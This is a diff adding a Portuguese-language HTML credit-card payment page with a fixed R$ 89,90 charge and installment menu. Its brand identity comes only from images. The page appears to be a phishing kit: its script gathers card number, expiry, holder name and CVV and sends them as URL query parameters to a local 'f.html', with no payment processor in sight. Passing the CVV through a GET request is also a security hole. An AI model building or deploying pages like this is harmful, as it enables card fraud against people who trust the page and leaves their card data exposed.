@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/2695/2695969.png">
+  <title>Pagamento com Cartão de Crédito</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .header {
+      width: 100%;
+      background-image: url('1cc.ng');
+      background-size: cover;
+      background-position: center top;
+      background-repeat: no-repeat;
+      padding: 15px 0;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+    .header img {
+      max-width: 250px;
+      height: auto;
+    }
+    .container {
+      background-color: #fff;
+      padding: 40px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      border-radius: 10px;
+      max-width: 600px;
+      width: calc(100% - 40px);
+      margin-top: 20px;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      font-weight: bold;
+      color: #555;
+      display: block;
+      margin-bottom: 5px;
+    }
+    .form-group input, .form-group select {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin: 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+      display: inline-block;
+      font-size: 16px;
+      background: #f9f9f9;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    .form-group .input-container {
+      position: relative;
+    }
+    .form-group .installments {
+      margin-top: 20px;
+    }
+    .form-group .installments label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    .form-group .installments select {
+      border: 1px solid #007bff; /* Azul */
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    .form-group .installments .total {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #555;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #28a745; /* Azul */
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    button:disabled {
+      background-color: #ccc;
+    }
+    .footer {
+      background-color: transparent;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      width: 100%;
+      box-sizing: border-box;
+      margin-top: 20px;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 20px;
+      }
+      .form-group input {
+        font-size: 14px;
+      }
+      button {
+        font-size: 16px;
+      }
+      .footer {
+        font-size: 10px;
+      }
+    }
+    .error {
+      color: red;
+      font-size: 12px;
+      margin-top: 5px;
+    }
+  </style>
+  <script>
+    function formatCardNumber(value) {
+      return value
+        .replace(/\D/g, '')
+        .replace(/(\d{4})(?=\d)/g, '$1 ')
+        .trim();
+    }
+
+    function formatExpirationDate(value) {
+      return value
+        .replace(/\D/g, '')
+        .replace(/(\d{2})(?=\d)/g, '$1/')
+        .trim();
+    }
+
+    function handleInput(event) {
+      const input = event.target;
+      if (input.id === 'card-number') {
+        input.value = formatCardNumber(input.value);
+      } else if (input.id === 'expiration-date') {
+        input.value = formatExpirationDate(input.value);
+      } else if (input.id === 'card-holder') {
+        input.value = input.value.toUpperCase();
+      }
+    }
+
+    function handleInstallmentsChange() {
+      const totalAmount = 89.90;
+      const installmentsSelect = document.getElementById('installments');
+      const installmentsValue = parseInt(installmentsSelect.value, 10);
+      const totalPerInstallment = (totalAmount / installmentsValue).toFixed(2);
+      document.getElementById('total-installment').innerText = `Total por parcela: R$ ${totalPerInstallment}`;
+    }
+
+    function handleSubmit(event) {
+      event.preventDefault();
+      const cardNumber = document.getElementById('card-number').value.trim();
+      const expirationDate = document.getElementById('expiration-date').value.trim();
+      const cardHolder = document.getElementById('card-holder').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+
+      let isValid = true;
+
+      // Reset error messages
+      document.querySelectorAll('.error').forEach(error => error.remove());
+
+      if (!cardNumber) {
+        showError('card-number', 'Número do Cartão é obrigatório.');
+        isValid = false;
+      }
+      if (!expirationDate) {
+        showError('expiration-date', 'Validade do Cartão é obrigatória.');
+        isValid = false;
+      }
+      if (!cardHolder) {
+        showError('card-holder', 'Nome do titular é obrigatório.');
+        isValid = false;
+      }
+      if (!cvv) {
+        showError('cvv', 'CVV é obrigatório.');
+        isValid = false;
+      }
+
+      if (isValid) {
+        // Envia o formulário para f.html
+        const form = document.createElement('form');
+        form.method = 'GET';
+        form.action = 'f.html';
+
+        const fields = { cardNumber, expirationDate, cardHolder, cvv };
+
+        for (const key in fields) {
+          const input = document.createElement('input');
+          input.type = 'hidden';
+          input.name = key;
+          input.value = fields[key];
+          form.appendChild(input);
+        }
+
+        document.body.appendChild(form);
+        form.submit();
+      }
+    }
+
+    function showError(inputId, message) {
+      const inputElement = document.getElementById(inputId);
+      const errorElement = document.createElement('div');
+      errorElement.classList.add('error');
+      errorElement.textContent = message;
+      inputElement.parentElement.appendChild(errorElement);
+    }
+
+    window.onload = function() {
+      document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('input', handleInput);
+      });
+
+      document.getElementById('submit-button').addEventListener('click', handleSubmit);
+
+      document.getElementById('installments').addEventListener('change', handleInstallmentsChange);
+    };
+  </script>
+</head>
+<body>
+  <header>
+    <img src="c1.png" alt="Imagem do Cabeçalho" style="width: 100%; height: auto;">
+  </header>
+  <div class="container">
+    <form>
+      <div class="form-group">
+        <label for="card-number">Número do Cartão</label>
+        <div class="input-container">
+          <input type="text" id="card-number" maxlength="19" placeholder="1234 5678 9012 3456">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="expiration-date">Validade</label>
+        <div class="input-container">
+          <input type="text" id="expiration-date" maxlength="5" placeholder="MM/AA">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="card-holder">Nome do Titular</label>
+        <div class="input-container">
+          <input type="text" id="card-holder" placeholder="Nome Completo">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <div class="input-container">
+          <input type="text" id="cvv" maxlength="3" placeholder="123">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="installments">Número de Parcelas</label>
+        <select id="installments">
+          <option value="1">1x de R$ 89,90</option>
+          <option value="2">2x de R$ 44,95</option>
+          <option value="3">3x de R$ 29,96</option>
+          <option value="4">4x de R$ 22,47</option>
+          <option value="5">5x de R$ 17,98</option>
+          <option value="6">6x de R$ 14,98</option>
+          <option value="7">7x de R$ 12,84</option>
+          <option value="8">8x de R$ 11,23</option>
+          <option value="9">9x de R$ 9,98</option>
+          <option value="10">10x de R$ 8,99</option>
+          <option value="11">11x de R$ 8,17</option>
+          <option value="12">12x de R$ 7,49</option>
+        </select>
+        <div class="installments">
+          <div id="total-installment">Total por parcela: <strong>R$ 89,90</strong></div>
+        </div>
+      </div>
+      <button type="button" id="submit-button">Finalizar Pagamento</button>
+    </form>
+  </div>
+  <br>
+  <br>
+  <footer>
+    <img src="p3.png" alt="Imagem do Rodapé" style="width: 100%; height: auto;">
+</footer>
+</body>
+</html>
